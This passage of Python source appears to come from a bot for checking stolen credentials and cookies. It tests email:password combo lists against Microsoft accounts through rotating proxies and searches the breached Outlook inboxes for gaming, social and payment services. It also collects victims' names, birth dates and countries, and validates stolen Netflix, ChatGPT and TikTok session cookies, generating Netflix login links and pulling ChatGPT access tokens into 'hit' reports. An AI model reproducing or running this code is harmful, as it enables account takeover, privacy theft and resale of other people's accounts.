                    'private':profile.get('private',False),'bio':profile.get('bio','')}
        return {'username':username,'emails_count':emails_count}
    except: return None

def check_instagram(sess, access_token, cid):
    try:
        inbox_result=_search_instagram_inbox(sess,access_token,cid)
        if not inbox_result or not inbox_result.get('username'): return None
        username=inbox_result['username']; emails_count=inbox_result.get('emails_count',0)
        profile=_get_instagram_profile(username)
        if profile:
            return {'username':username,'emails_count':emails_count,
                    'full_name':profile.get('full_name','N/A'),'followers':profile.get('followers',0),
                    'following':profile.get('following',0),'posts':profile.get('posts',0),
                    'verified':profile.get('verified',False),'private':profile.get('private',False),
                    'bio':profile.get('bio','')}
        return {'username':username,'emails_count':emails_count}
    except: return None

def check_minecraft_via_xbox(sess):
    try:
        r=sess.get(
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en&prompt=none",
            headers={"User-Agent":UA},allow_redirects=True,timeout=12)
        if _dosubmit(r.text): r=_form_sub(sess,r)
        tm=re.search(r'access_token=([^&]+)',r.url)
        if not tm: return None,None
        rps_ticket=tm.group(1)
        xh={"User-Agent":UA,"Content-Type":"application/json","x-xbl-contract-version":"1"}
        ur=sess.post("https://user.auth.xboxlive.com/user/authenticate",headers=xh,
                     json={"Properties":{"AuthMethod":"RPS","RpsTicket":rps_ticket,"SiteName":"user.auth.xboxlive.com"},
                           "RelyingParty":"http://auth.xboxlive.com","TokenType":"JWT"},timeout=10)
        if ur.status_code!=200: return None,None
        user_token=ur.json().get("Token")
        if not user_token: return None,None
        xr=sess.post("https://xsts.auth.xboxlive.com/xsts/authorize",headers=xh,
                     json={"Properties":{"SandboxId":"RETAIL","UserTokens":[user_token]},
                           "RelyingParty":"rp://api.minecraftservices.com/","TokenType":"JWT"},timeout=10)
        xd=xr.json()
        if "Token" not in xd:
            xr=sess.post("https://xsts.auth.xboxlive.com/xsts/authorize",headers=xh,
                         json={"Properties":{"SandboxId":"RETAIL","UserTokens":[user_token]},
                               "RelyingParty":"http://xboxlive.com","TokenType":"JWT"},timeout=10)
            xd=xr.json()
            if "Token" not in xd: return None,None
        xsts_token=xd["Token"]; uhs=xd["DisplayClaims"]["xui"][0]["uhs"]
        mc_auth=sess.post("https://api.minecraftservices.com/authentication/login_with_xbox",
            json={"identityToken":f"XBL3.0 x={uhs};{xsts_token}"},
            headers={"User-Agent":UA,"Content-Type":"application/json"},timeout=10)
        if mc_auth.status_code!=200: return None,None
        mc_token=mc_auth.json().get("access_token")
        if not mc_token: return None,None
        mc_profile=sess.get("https://api.minecraftservices.com/minecraft/profile",
            headers={"Authorization":f"Bearer {mc_token}","User-Agent":UA},timeout=10)
        if mc_profile.status_code==200:
            data=mc_profile.json()
            return data.get('name','Unknown'),data.get('id','')
        return None,None
    except: return None,None

def check_minecraft_via_mail(sess, access_token, cid):
    return _search_mail(sess,access_token,cid,
        "from:noreply@account.mojang.com OR from:noreply@email.accounts.mojang.com OR minecraft OR mojang")

# ══════════════════════════════════════════════════════════
#  INBOX ENGINE (PKCE — DC bot implementation)
# ══════════════════════════════════════════════════════════

_CLIENT_ID    = "e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
_REDIRECT_URI = "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
_REDIRECT_URI_AUTH = "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"

def _extract_urlpost(text):
    for pat in [r'"urlPost"\s*:\s*"(https?://[^"]+)"',r"urlPost\\\":\\\"(https?://[^\\\"]+)\\\"",
                r"'urlPost'\s*:\s*'(https?://[^']+)'"]:
        m=re.search(pat,text)
        if m: return m.group(1).replace("\\/","/")
    return None

def _extract_ppft(text):
    for pat in [r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"\\]{20,})\\"',
                r'name=\\"PPFT\\"[^"\\]*value=\\"([^"\\]{20,})\\"',
                r'id=\\"i0327\\"[^"\\]*value=\\"([^"\\]{20,})\\"',
                r'name="PPFT"[^>]*value="([^"]{20,})"',
                r'id="i0327"[^>]*value="([^"]{20,})"',
                r'"sFT"\s*:\s*"([^"]{20,})"',r'"PPFT"\s*:\s*"([^"]{20,})"']:
        m=re.search(pat,text)
        if m: return m.group(1)
    return None

_proxy_cycle_lock=threading.Lock()
_proxy_cycle_idx=0

def _pick_proxy(proxies_list):
    global _proxy_cycle_idx
    if not proxies_list: return None
    with _proxy_cycle_lock:
        p=proxies_list[_proxy_cycle_idx%len(proxies_list)]
        _proxy_cycle_idx+=1
    try:
        parts=p.strip().split(":")
        if len(parts)==4:
            h,po,u,pw=parts; url=f"http://{u}:{pw}@{h}:{po}"
            return {"http":url,"https":url}
        if "@" in p:
            url=f"http://{p}" if not p.startswith("http") else p
            return {"http":url,"https":url}
        if len(parts)==2:
            return {"http":f"http://{p}","https":f"http://{p}"}
    except: pass
    return None

def _get_profile(token, cid):
    default={'name':'Unknown','country':'Unknown','birth_date':'Unknown'}
    try:
        headers={"User-Agent":"Outlook-Android/2.0","Pragma":"no-cache","Accept":"application/json",
                 "ForceSync":"false","Authorization":f"Bearer {token}","X-AnchorMailbox":f"CID:{cid}",
                 "Host":"substrate.office.com","Connection":"Keep-Alive","Accept-Encoding":"gzip"}
        r=requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",headers=headers,timeout=10)
        if r.status_code!=200:
            r=requests.get("https://substrate.office.com/users/v2.0/me",headers=headers,timeout=8)
        if r.status_code!=200: return default
        d=r.json(); name="Unknown"
        if 'names' in d and d['names']: name=d['names'][0].get('displayName','Unknown')
        if name=='Unknown': name=d.get('displayName',d.get('userPrincipalName','Unknown'))
        if name and '@' in name: name=name.split('@')[0]
        if name=='Unknown' and 'givenName' in d and 'surname' in d:
            name=f"{d['givenName']} {d['surname']}".strip() or 'Unknown'
        country="Unknown"
        if 'accounts' in d and d['accounts']: country=d['accounts'][0].get('location','Unknown')
        if country=='Unknown': country=d.get('country','Unknown')
        birth_date="Unknown"
        try:
            js=json.dumps(d)
            day=re.search(r'"birthDay"\s*:\s*"?(\d{1,2})"?',js)
            mon=re.search(r'"birthMonth"\s*:\s*"?(\d{1,2})"?',js)
            yr=re.search(r'"birthYear"\s*:\s*"?(\d{4})"?',js)
            if day and mon and yr:
                birth_date=f"{day.group(1).zfill(2)}/{mon.group(1).zfill(2)}/{yr.group(1)}"
            elif yr: birth_date=yr.group(1)
        except: pass
        return {'name':name,'country':country,'birth_date':birth_date}
    except: return default

def _general_scan(email, token, cid):
    try:
        url_owa=f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        headers_owa={"x-owa-sessionid":cid,"authorization":f"Bearer {token}",
                     "user-agent":"Mozilla/5.0 (Linux; Android 9; SM-G975N)",
                     "action":"StartupData","origin":"https://outlook.live.com",
                     "x-requested-with":"com.microsoft.outlooklite"}
        r=requests.post(url_owa,headers=headers_owa,data="")
        content=r.text.lower(); found=[]; seen=set()
        for svc,domains in SERVICES_ALL.items():
            for d in domains:
                dl=d.lower()
                if dl not in content: continue
                confirmed=(f"@{dl}" in content or f"noreply@{dl}" in content or
                           f"no-reply@{dl}" in content or f"{dl}/" in content or f"www.{dl}" in content)
                if not confirmed and svc in ["Facebook","Instagram","TikTok","Twitter/X"]:
                    confirmed=dl in content and ("@" in content or "noreply" in content)
                if confirmed and svc not in seen:
                    seen.add(svc); found.append(svc); break
        return found,content
    except: return [],""

def _psn_scan(token, cid):
    empty={"has_psn":False,"orders":0,"online_ids":[],"psn_emails_count":0}
    try:
        search_url="https://outlook.live.com/search/api/v2/query"
        headers={"User-Agent":"Outlook-Android/2.0","Authorization":f"Bearer {token}","X-AnchorMailbox":f"CID:{cid}"}
        payload={"Cvid":str(uuid.uuid4()),
                 "EntityRequests":[{"EntityType":"Conversation","ContentSources":["Exchange"],
                     "Query":{"QueryString":"sony@txn-email.playstation.com"},"Size":50}]}
        r=requests.post(search_url,json=payload,headers=headers,timeout=15)
        if r.status_code!=200: return empty
        txt=json.dumps(r.json())
        psn_domains=["sony@txn-email.playstation.com","Sony@email.sonyentertainmentnetwork.com"]
        count=sum(txt.lower().count(d.lower()) for d in psn_domains)
        if count==0: return empty
        payload_store={"Cvid":str(uuid.uuid4()),
                       "EntityRequests":[{"EntityType":"Conversation","ContentSources":["Exchange"],
                           "Query":{"QueryString":"PlayStation\u00aeStore OR PlayStation\u2122Store"},"Size":25}]}
        store_count=0
        try:
            rs=requests.post(search_url,json=payload_store,headers=headers,timeout=10)
            if rs.status_code==200:
                st2=json.dumps(rs.json())
                store_count=st2.count("PlayStation\u00aeStore")+st2.count("PlayStation\u2122Store")
        except: pass
        orders_count=store_count//2 if store_count>0 else 0
        patterns=[r'(?i)(?:Hello|Hi|Welcome back)[\s,]+["\']?([a-zA-Z0-9_-]{3,20})["\']?',
                  r'(?i)Signed in as[\s:]+([a-zA-Z0-9_-]{3,20})',
                  r'(?i)(?:psn[\s_-]*id|online[\s_-]*id)[\s:]*["\']?([a-zA-Z0-9_-]{3,20})["\']?']
        oids=[]
        for pat in patterns:
            for m in re.findall(pat,txt):
                m=m.strip().strip('"').strip("'")
                if 3<=len(m)<=20 and m not in oids: oids.append(m)
        return {"has_psn":True,"orders":orders_count,"online_ids":list(set(oids))[:3],"psn_emails_count":count}
    except: return empty

def _extract_username_from_email(email):
    try:
        u=email.split('@')[0].lower()
        u=re.sub(r'[^a-zA-Z0-9_.]','',u)
        return u if 3<=len(u)<=30 else None
    except: return None

def _extract_username_from_content(content, platform):
    patterns={
        "TikTok":[r'tiktok\.com/@([a-zA-Z0-9_.]{3,30})',r'@([a-zA-Z0-9_.]{3,30})\s'],
        "Instagram":[r'instagram\.com/([a-zA-Z0-9_.]{3,30})',r'@([a-zA-Z0-9_.]{3,30})\s'],
        "Facebook":[r'facebook\.com/([a-zA-Z0-9.]{3,50})'],
        "Twitter/X":[r'twitter\.com/([a-zA-Z0-9_]{3,30})',r'x\.com/([a-zA-Z0-9_]{3,30})'],
    }
    for pat in patterns.get(platform,[]):
        for m in re.findall(pat,content,re.IGNORECASE):
            m=m.strip()
            if 3<=len(m)<=30 and not any(x in m.lower() for x in ['email','mail','account','support']):
                return m
    return None

def check_inbox_account(email, password, proxies_list=None):
    retries=0
    for attempt in range(3):
        proxy=_pick_proxy(proxies_list) if proxies_list else None
        proxy_kwargs={"proxies":proxy,"verify":False} if proxy else {"verify":False}
        sess=requests.Session()
        ua=_get_ua()
        sess.headers.update({"User-Agent":ua,"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language":"en-US,en;q=0.9"})
        try:
            import hashlib as _hashlib
            _raw=os.urandom(32)
            code_verifier=base64.urlsafe_b64encode(_raw).rstrip(b'=').decode('ascii')
            code_challenge=base64.urlsafe_b64encode(_hashlib.sha256(code_verifier.encode('ascii')).digest()).rstrip(b'=').decode('ascii')
            _auth_url=("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"+
                urllib.parse.urlencode({"client_info":"1","haschrome":"1","login_hint":email,"mkt":"en",
                    "response_type":"code","client_id":_CLIENT_ID,"scope":"profile openid offline_access https://outlook.office.com/M365.Access",
                    "redirect_uri":_REDIRECT_URI_AUTH,"code_challenge":code_challenge,"code_challenge_method":"S256"}))
            res_auth=sess.get(_auth_url,timeout=12,**proxy_kwargs)
            txt=res_auth.text
            host=_extract_urlpost(txt); ppft=_extract_ppft(txt)
            if not host or not ppft:
                retries+=1; time.sleep(1.5); continue
            res_login=sess.post(host,
                data={"i13":"1","login":email,"loginfmt":email,"type":"11","LoginOptions":"1",
                      "passwd":password,"PPFT":ppft,"PPSX":"PassportR","i19":str(random.randint(3000,15000))},
                headers={"Content-Type":"application/x-www-form-urlencoded","Referer":res_auth.url},
                allow_redirects=False,timeout=12,**proxy_kwargs)
            login_cookies={**sess.cookies.get_dict(),**res_login.cookies.get_dict()}
            if not any(k in login_cookies for k in ["JSH","JSHP","ANON","WLSSC"]):
                return {"status":"bad","email":email,"password":password,"retries":retries}
            location=res_login.headers.get("Location","")
            if "code=" not in location:
                try:
                    res_redir=sess.get(location,allow_redirects=True,timeout=8,**proxy_kwargs)
                    location=res_redir.url
                except: pass
            if "code=" not in location:
                return {"status":"bad","email":email,"password":password,"retries":retries}
            auth_code=urllib.parse.unquote(location.split("code=")[1].split("&")[0])
            cid=login_cookies.get("MSPCID",str(uuid.uuid4())).upper()
            token_res=sess.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data={"client_id":_CLIENT_ID,"redirect_uri":_REDIRECT_URI,
                      "grant_type":"authorization_code","code":auth_code,
                      "scope":"profile openid offline_access https://outlook.office.com/M365.Access",
                      "code_verifier":code_verifier},timeout=12,**proxy_kwargs).json()
            token=token_res.get("access_token")
            if not token:
                retries+=1
                if attempt<2: time.sleep(1)
                continue
            profile=_get_profile(token,cid)
            services,content=_general_scan(email,token,cid)
            psn_details={}
            if "PlayStation" in services: psn_details=_psn_scan(token,cid)
            social_links={}
            for platform in _SOCIAL_LINK_PLATFORMS:
                if platform in services:
                    uname=_extract_username_from_content(content,platform)
                    if not uname: uname=_extract_username_from_email(email)
                    if uname:
                        social_links[platform]={"username":uname,"link":_SOCIAL_LINK_TMPL.get(platform,"").format(u=uname)}
            folder_map={"General":[],"Games":[],"Social":[],"Apps":[],"Payment":[],"Proxy":[],"PSN":[]}
            for svc in services: folder_map[_service_folder(svc)].append(svc)
            if psn_details.get("has_psn"):
                if "PlayStation" not in folder_map["PSN"]: folder_map["PSN"].append("PlayStation")
            info_line=(f"Email: {email} | Pass: {password} | "
                       f"Name: {profile['name']} | Country: {profile['country']} | Birth: {profile['birth_date']}")
            has_any=any(v for v in folder_map.values() if v) or bool(social_links)
            result_status="hit" if has_any else "valid"
            return {"status":result_status,"email":email,"password":password,"retries":retries,
                    "profile":profile,"services":services,"folder_map":folder_map,
                    "social_links":social_links,"psn_details":psn_details,"info_line":info_line}
        except Exception as exc:
            log(f"[INBOXER] attempt {attempt+1} exception for {email}: {exc}","ERROR")
            retries+=1
            if attempt<2: time.sleep(1)
    return {"status":"error","email":email,"password":password,"retries":retries}

def parse_inbox_combos(lines_list):
    combos=[]; bad=0
    for line in lines_list:
        line=line.strip()
        if not line or line.startswith('#'): bad+=1; continue
        if ':' in line:
            parts=line.split(':',1)
            if len(parts)==2 and '@' in parts[0] and parts[1].strip():
                combos.append((parts[0].strip(),parts[1].strip()))
            else: bad+=1
        else: bad+=1
    total=len(combos)+bad
    return combos,total,bad

# ══════════════════════════════════════════════════════════
#  COOKIE ENGINE (DC bot real implementation)
# ══════════════════════════════════════════════════════════

_px_lock=threading.Lock(); _px_idx=0; _dead_px: set=set()

def _proxy_str_to_requests(p):
    if not p: return None
    try:
        parts=p.split(":")
        if len(parts)==4: url=f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts)==2: url=f"http://{parts[0]}:{parts[1]}"
        else: url=p if p.startswith("http") else f"http://{p}"
        return {"http":url,"https":url}
    except: return None

def _next_proxy_ck(proxies_list):
    global _px_idx,_dead_px
    if not proxies_list: return None
    with _px_lock:
        attempts=0
        while attempts<len(proxies_list)*2:
            p=proxies_list[_px_idx%len(proxies_list)]
            _px_idx+=1; attempts+=1
            if p not in _dead_px: return _proxy_str_to_requests(p)
        _dead_px.clear()
        p=proxies_list[_px_idx%len(proxies_list)]
        _px_idx+=1
        return _proxy_str_to_requests(p)

def _mark_dead(proxy_dict):
    if proxy_dict:
        with _px_lock: _dead_px.add(proxy_dict.get("http",""))

def _parse_cookies_from_text(text):
    text=text.strip()
    if not text: return {}
    try:
        if text.startswith('[') or text.startswith('{'):
            data=json.loads(text)
            if isinstance(data,list):
                cookies={}
                for item in data:
                    if isinstance(item,dict):
                        name=item.get("name",item.get("Name",""))
                        value=item.get("value",item.get("Value",""))
                        if name and value is not None: cookies[str(name)]=str(value)
                return cookies
            elif isinstance(data,dict): return {str(k):str(v) for k,v in data.items()}
    except: pass
    cookies={}
    for line in text.split('\n'):
        line=line.strip()
        if not line or line.startswith('#'): continue
        parts=line.split('\t')
        if len(parts)>=7:
            name=parts[5].strip(); value=parts[6].strip()
            if name: cookies[name]=value; continue
        if '=' in line and not line.startswith('http'):
            kv=line.split('=',1)
            if len(kv)==2:
                name=kv[0].strip().strip('"'); value=kv[1].strip().strip(';').strip('"')
                if name and len(name)>1 and not name.startswith('.'): cookies[name]=value
    return cookies

def extract_cookie_files(content: bytes, filename: str) -> List[Tuple[str, str]]:
    """Returns [(source_name, text)] pairs from .txt or .zip bytes."""
    files=[]
    if filename.lower().endswith('.zip'):
        try:
            with zipfile.ZipFile(io.BytesIO(content)) as zf:
                for name in zf.namelist():
                    if name.lower().endswith('.txt') and '__MACOSX' not in name:
                        try:
                            text=zf.read(name).decode('utf-8',errors='ignore')
                            if text.strip(): files.append((name,text))
                        except: pass
        except: pass
    else:
        text=content.decode('utf-8',errors='ignore')
        if text.strip(): files.append((filename,text))
    return files

_NETFLIX_REQUIRED=['NetflixId','SecureNetflixId','nfvdid']

def is_valid_netflix(d): return all(k in d for k in _NETFLIX_REQUIRED)

def count_valid_netflix(files):
    result=[]
    for src,text in files:
        d=_parse_cookies_from_text(text)
        if is_valid_netflix(d): result.append((src,d))
    return len(result),result

def check_netflix_cookie(cookies_dict, proxies_list):
    px=None
    try:
        px=_next_proxy_ck(proxies_list) if proxies_list else None
        cookie_str='; '.join(f"{k}={v}" for k,v in cookies_dict.items())
        headers={'User-Agent':'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
                 'Accept':'multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json',
                 'Content-Type':'application/json','Cookie':cookie_str,'Origin':'https://www.netflix.com','Referer':'https://www.netflix.com/'}
        payload={"operationName":"CreateAutoLoginToken","variables":{"scope":"WEBVIEW_MOBILE_STREAMING"},
                 "extensions":{"persistedQuery":{"version":102,"id":"76e97129-f4b5-41a0-a73c-12e674896849"}}}
        r=requests.post('https://android13.prod.ftl.netflix.com/graphql',headers=headers,json=payload,proxies=px,timeout=(8,20),verify=False)
        if r.status_code in [401,403]: return None,'expired'
        if r.status_code!=200:
            if px: _mark_dead(px)
            return None,'error'
        data=r.json()
        if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
            token=data['data']['createAutoLoginToken']
            return {"token":token,"link":f"https://netflix.com/?nftoken={token}"},'valid'
        elif 'errors' in data: return None,'expired'
        return None,'error'
    except requests.exceptions.ProxyError:
        if px: _mark_dead(px)
        return None,'proxy_error'
    except: return None,'error'

def _netscape_netflix(d):
    lines=["# Netscape HTTP Cookie File",""]
    for name,value in d.items():
        lines.append(f".netflix.com\tTRUE\t/\tTRUE\t0\t{name}\t{value}")
    return "\n".join(lines)

def format_hit_netflix(result, cookies_dict, source):
    ts=datetime.now().strftime('%Y-%m-%d %H:%M:%S'); token=result['token']
    netscape=_netscape_netflix(cookies_dict)
    content=f"""════════════════════════════════════════════════
  {DEV_NAME} Netflix Cookie Checker
════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

════════════════════════════════════════════════
  ACCOUNT INFO
════════════════════════════════════════════════

  NFToken    : {token}
  Link       : https://netflix.com/?nftoken={token}

════════════════════════════════════════════════
  COOKIES (Netscape)
════════════════════════════════════════════════
{netscape}

  RAW JSON: {json.dumps(cookies_dict,ensure_ascii=False)[:500]}
════════════════════════════════════════════════
"""
    safe_src=re.sub(r'[<>:"/\\|?*\s]','_',source).replace('.txt','')
    return content,f"[netflix][{safe_src}].txt"

_GPT_SESSION_KEYS=['__Secure-next-auth.session-token','__Secure-next-auth.session-token.0',
                   '__Secure-next-auth.session-token.1','oai-sc']

def is_valid_chatgpt(d): return any(k in d for k in _GPT_SESSION_KEYS)

def count_valid_chatgpt(files):
    result=[]
    for src,text in files:
        d=_parse_cookies_from_text(text)
        if is_valid_chatgpt(d): result.append((src,d))
    return len(result),result

def check_chatgpt_cookie(cookies_dict, proxies_list):
    px=None
    try:
        px=_next_proxy_ck(proxies_list) if proxies_list else None
        headers={"authority":"chatgpt.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                 "accept-language":"en-US,en;q=0.9",
                 "user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"}
        r=requests.get("https://chatgpt.com/",cookies=cookies_dict,headers=headers,proxies=px,timeout=(8,20),allow_redirects=True,verify=False)
        if r.status_code!=200:
            if px: _mark_dead(px)
            return None,'error'
        if "login" in r.url.lower() or "auth0" in r.url.lower(): return None,'expired'
        data=r.text
        scripts=re.findall(r'<script[^>]*id="client-bootstrap"[^>]*>(.*?)</script>',data,re.DOTALL)
        for script in scripts:
            try:
                js=json.loads(script)
                if js.get("authStatus")=="logged_in":
                    user=js.get("session",{}).get("user",{})
                    account=js.get("session",{}).get("account",{})
                    session=js.get("session",{})
                    plan=account.get("planType","N/A")
                    is_paid=bool(plan and plan.lower() not in ("free","n/a",""))
                    return {"name":user.get("name","N/A"),"email":user.get("email","N/A"),
                            "plan":plan,"is_paid":is_paid,"expires":session.get("expires","N/A"),
                            "access_token":session.get("accessToken","N/A"),
                            "features":account.get("features",[]),"entitlement":account.get("entitlement",{}),
                            "rate_limits":account.get("rate_limits",[])},'valid'
            except: continue
        if "logged_in" in data:
            em=re.search(r'"email"\s*:\s*"([^"]+)"',data)
            pl=re.search(r'"planType"\s*:\s*"([^"]+)"',data)
            nm=re.search(r'"name"\s*:\s*"([^"]+)"',data)
            if em:
                plan=pl.group(1) if pl else "N/A"
                return {"name":nm.group(1) if nm else "N/A","email":em.group(1),"plan":plan,
                        "is_paid":bool(plan and plan.lower() not in ("free","n/a","")),
                        "expires":"N/A","access_token":"N/A","features":[],"entitlement":{},"rate_limits":[]},'valid'
        return None,'expired'
    except requests.exceptions.ProxyError:
        if px: _mark_dead(px)
        return None,'proxy_error'
    except: return None,'error'

def _netscape_chatgpt(d):
    lines=["# Netscape HTTP Cookie File",""]
    for name,value in d.items():
        secure="TRUE" if name.startswith("__Secure") or name.startswith("__Host") else "FALSE"
        lines.append(f".chatgpt.com\tTRUE\t/\t{secure}\t0\t{name}\t{value}")
    return "\n".join(lines)

def format_hit_chatgpt(result, cookies_dict, source):
    ts=datetime.now().strftime('%Y-%m-%d %H:%M:%S'); netscape=_netscape_chatgpt(cookies_dict)
    token=result.get("access_token","N/A")
    if token and token!="N/A" and len(token)>80: token=token[:40]+"..."+token[-40:]
    features_str="\n".join(f"  - {f}" for f in result.get("features",[])) or "  N/A"
    content=f"""════════════════════════════════════════════════
  {DEV_NAME} ChatGPT Cookie Checker
════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}
  Name       : {result.get('name','N/A')}
  Email      : {result.get('email','N/A')}
  Plan       : {result.get('plan','N/A')}
  Paid       : {result.get('is_paid',False)}
  Expires    : {result.get('expires','N/A')}
  Token      : {token}

  Features:
{features_str}

════════════════════════════════════════════════
  COOKIES (Netscape)
════════════════════════════════════════════════
{netscape}
════════════════════════════════════════════════
"""
    safe_plan=re.sub(r'[<>:"/\\|?*\s]','_',result.get("plan","unknown").lower())
    safe_email=re.sub(r'[<>:"/\\|?*\s]','_',result.get("email","unknown"))
    return content,f"[{safe_plan}][{safe_email}].txt"

_TIKTOK_SESSION_KEYS=['sessionid','sid_tt']

def is_valid_tiktok(d): return any(k in d for k in _TIKTOK_SESSION_KEYS)

def count_valid_tiktok(files):
    result=[]
    for src,text in files:
        d=_parse_cookies_from_text(text)
        if is_valid_tiktok(d): result.append((src,d))
    return len(result),result

def check_tiktok_cookie(cookies_dict, proxies_list):
    px=None
    try:
        px=_next_proxy_ck(proxies_list) if proxies_list else None
        headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                 'Accept':'application/json, text/plain, */*','Accept-Language':'en-US,en;q=0.9','Referer':'https://www.tiktok.com/'}
        r=requests.get('https://www.tiktok.com/passport/web/account/info/',cookies=cookies_dict,headers=headers,proxies=px,timeout=(5,10),allow_redirects=True,verify=False)
        if r.status_code!=200:
            if px: _mark_dead(px)
            return None,'error'
        try: data=r.json()
        except: return None,'error'
        error_code=data.get('error_code') or data.get('code') or 0
        if error_code in [8,13,10,2483,2484]: return None,'expired'
        combo=(str(data.get('message',''))+' '+str(data.get('description',''))).lower()
        if any(w in combo for w in ['expired','login','unauthorized','invalid','need login','not logged']):
            return None,'expired'
        acc=data.get('data',{})
        if not acc or not acc.get('username'): return None,'expired'
        username=acc['username']
        stats={'nickname':'','followers':0,'following':0,'likes':0,'videos':0}
        try:
            r2=requests.get(f'https://www.tiktok.com/api/user/detail/?uniqueId={username}',
                cookies=cookies_dict,headers=headers,proxies=px,timeout=(5,8),verify=False)
            if r2 and r2.status_code==200:
                d2=r2.json(); ui=d2.get('userInfo',{}); u2=ui.get('user',{}); s2=ui.get('stats',{})
                if u2.get('uniqueId','').lower()==username.lower():
                    stats={'nickname':u2.get('nickname',''),'followers':s2.get('followerCount',0),
                           'following':s2.get('followingCount',0),'likes':s2.get('heartCount',0),'videos':s2.get('videoCount',0)}
        except: pass
        return {"username":username,"nickname":stats['nickname'],"followers":stats['followers'],
                "following":stats['following'],"likes":stats['likes'],"videos":stats['videos'],
                "profile":f"https://www.tiktok.com/@{username}"},'valid'
    except requests.exceptions.ProxyError:
        if px: _mark_dead(px)
        return None,'proxy_error'
    except: return None,'error'

def _netscape_tiktok(d):
    lines=["# Netscape HTTP Cookie File",""]
    priority=['sessionid','sid_tt','uid_tt','odin_tt','ttwid']
    keys_sorted=[k for k in priority if k in d]+[k for k in d if k not in priority]
    for name in keys_sorted:
        lines.append(f".tiktok.com\tTRUE\t/\tFALSE\t0\t{name}\t{d[name]}")
    return "\n".join(lines)

def format_hit_tiktok(result, cookies_dict, source):
    ts=datetime.now().strftime('%Y-%m-%d %H:%M:%S'); netscape=_netscape_tiktok(cookies_dict)
    username=result.get('username','unknown')

    def _fmt_n(n):
        try:
            n=int(n)
            if n>=1000000: return f"{n/1000000:.1f}M"
            elif n>=1000: return f"{n/1000:.1f}K"
            return str(n)
        except: return str(n)

    content=f"""════════════════════════════════════════════════
  {DEV_NAME} TikTok Cookie Checker
════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}
  Username   : @{username}
  Nickname   : {result.get('nickname','N/A')}
  Followers  : {_fmt_n(result.get('followers',0))}
  Following  : {_fmt_n(result.get('following',0))}
  Likes      : {_fmt_n(result.get('likes',0))}
  Videos     : {result.get('videos',0)}
  Profile    : {result.get('profile','N/A')}

════════════════════════════════════════════════
  COOKIES (Netscape)
════════════════════════════════════════════════
{netscape}
════════════════════════════════════════════════
"""
    safe_user=re.sub(r'[<>:"/\\|?*\s]','_',username)
    return content,f"[@{safe_user}][{result.get('followers',0)}_followers].txt"

def _format_number(n):
    try:
        n=int(n)
        if n>=1000000: return f"{n/1000000:.1f}M"
        elif n>=1000: return f"{n/1000:.1f}K"
        return str(n)
    except: return str(n)

# ══════════════════════════════════════════════════════════
#  SESSION CLASSES
# ══════════════════════════════════════════════════════════

class CheckerStats:
    def __init__(self):
        self.lock=threading.Lock()
        self.total=0; self.valid=0; self.bad_lines=0; self.checked=0; self.bad=0
        self.twofa=0; self.errors=0; self.retries=0; self.proxy_err=0
        self.psn=0; self.steam=0; self.supercell=0; self.tiktok=0; self.instagram=0; self.minecraft=0
        self.xbox_codes=0; self.xbox_pulled=0; self.xbox_pulled_valid=0
        self.discord_total=0; self.discord_valid=0; self.discord_claimed=0; self.discord_unk=0
        self.balance=0; self.rp_hits=0; self.rp_total_pts=0
        self.xgpu=0; self.xgpp=0; self.xgpe=0; self.m365=0; self.other_svc=0; self.svc_free=0
        self.hits=0
        self.all_hits=[]         # (email,pwd,category,details)
        self.svc_results=[]      # (email,pwd,[svc_name_strs])
        self.all_services=[]
        self.balance_list=[]     # (email,pwd,balance,currency,holder)
        self.rp_list=[]          # (email,pwd,pts)
        self.discord_list=[]     # (email,pwd,link,status,desc)
        self.xbox_code_list=[]   # (email,pwd,code,title)
        self.xbox_pulled_by_status={"VALID":[],"BALANCE_CODE":[],"VALID_REQUIRES_CARD":[],
            "REDEEMED":[],"EXPIRED":[],"INVALID":[],"DEACTIVATED":[],"UNKNOWN":[],
            "REGION_LOCKED":[],"RATE_LIMITED":[],"ERROR":[]}
        self.psn_list=[]; self.steam_list=[]; self.supercell_list=[]
        self.tiktok_list=[]; self.instagram_list=[]; self.minecraft_list=[]
        self.bad_list=[]; self.twofa_list=[]; self.error_list=[]
        self.tiktok_followers_ranges={'0-999':0,'1k-1.9k':0,'2k-2.9k':0,'3k-3.9k':0,'4k-4.9k':0,
            '5k-5.9k':0,'6k-6.9k':0,'7k-7.9k':0,'8k-8.9k':0,'9k-9.9k':0,'10k-99k':0,
            '100k-199k':0,'200k-299k':0,'300k-399k':0,'400k-499k':0,'500k-599k':0,
            '600k-699k':0,'700k-799k':0,'800k-899k':0,'900k-999k':0,'1m+':0}
        self.instagram_followers_ranges={'0-999':0,'1k-1.9k':0,'2k-2.9k':0,'3k-3.9k':0,'4k-4.9k':0,
            '5k-5.9k':0,'6k-6.9k':0,'7k-7.9k':0,'8k-8.9k':0,'9k-9.9k':0,'10k-99k':0,
            '100k-199k':0,'200k-299k':0,'300k-399k':0,'400k-499k':0,'500k-599k':0,
